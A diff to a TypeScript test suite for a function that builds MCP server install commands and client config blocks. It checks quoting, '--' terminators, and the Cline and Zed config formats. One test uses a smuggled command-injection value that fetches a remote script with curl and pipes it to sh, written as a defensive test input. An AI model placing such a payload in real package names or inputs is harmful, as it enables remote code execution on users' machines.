@@ -59,7 +59,7 @@ test('embedded single quotes are escaped POSIX-style', () => {
 test('a hostile npm identifier cannot produce a runnable command', () => {
   const out = buildInstalls(srv({ npmPackage: 'evil; curl http://x.sh | sh' }));
   const commands = out.filter((t) => t.command).map((t) => t.command!);
-  assert.ok(commands.length >= 3, 'expected the three shell targets');
+  assert.ok(commands.length >= 2, 'expected the claude-code and gemini-cli shell targets');
   for (const c of commands) {
     // The payload must be inside single quotes, so the shell treats it as one argument.
     assert.ok(
@@ -95,7 +95,9 @@ test('an option-shaped identifier cannot reach a runner as an option', () => {
     );
   }
   for (const t of out.filter((x) => x.json)) {
-    const args: string[] = Object.values(JSON.parse(t.json!).mcpServers)[0] ? (Object.values(JSON.parse(t.json!).mcpServers)[0] as { args: string[] }).args : [];
+    const parsed = JSON.parse(t.json!);
+    const block = parsed.mcpServers ?? parsed.context_servers;
+    const args: string[] = Object.values(block)[0] ? (Object.values(block)[0] as { args: string[] }).args : [];
     assert.ok(args.includes('--'), `argv lacks a terminator: ${JSON.stringify(args)}`);
     assert.ok(args.indexOf('--') < args.indexOf(payload), 'terminator must precede the payload');
   }
@@ -121,7 +123,28 @@ test('the rendered command is exactly this literal (no recomputation)', () => {
   const pkg = "weird pkg'name";
   const out = buildInstalls(srv({ npmPackage: pkg }));
   assert.equal(
-    out.find((t) => t.client === 'cline')!.command,
-    "npx -y -- 'weird pkg'\\''name'",
+    out.find((t) => t.client === 'claude-code')!.command,
+    "claude mcp add --scope user x -- npx -y -- 'weird pkg'\\''name'",
   );
+});
+
+test('cline gets a cline_mcp_settings.json mcpServers block, not a shell line', () => {
+  const t = buildInstalls(srv({ npmPackage: '@playwright/mcp' })).find((x) => x.client === 'cline')!;
+  assert.equal(t.command, undefined);
+  assert.match(t.label, /cline_mcp_settings\.json/);
+  assert.deepEqual(JSON.parse(t.json!), {
+    mcpServers: { x: { command: 'npx', args: ['-y', '--', '@playwright/mcp'] } },
+  });
+});
+
+test('zed gets a context_servers block (Zed ignores mcpServers), env included', () => {
+  const t = buildInstalls(
+    srv({ npmPackage: '@playwright/mcp', envVars: [{ name: 'API_KEY', isSecret: true }] }),
+  ).find((x) => x.client === 'zed')!;
+  const parsed = JSON.parse(t.json!);
+  assert.equal(parsed.mcpServers, undefined);
+  assert.deepEqual(parsed.context_servers, {
+    x: { command: 'npx', args: ['-y', '--', '@playwright/mcp'], env: { API_KEY: '<your-api_key>' } },
+  });
+  assert.match(t.label, /^Zed /);
 });
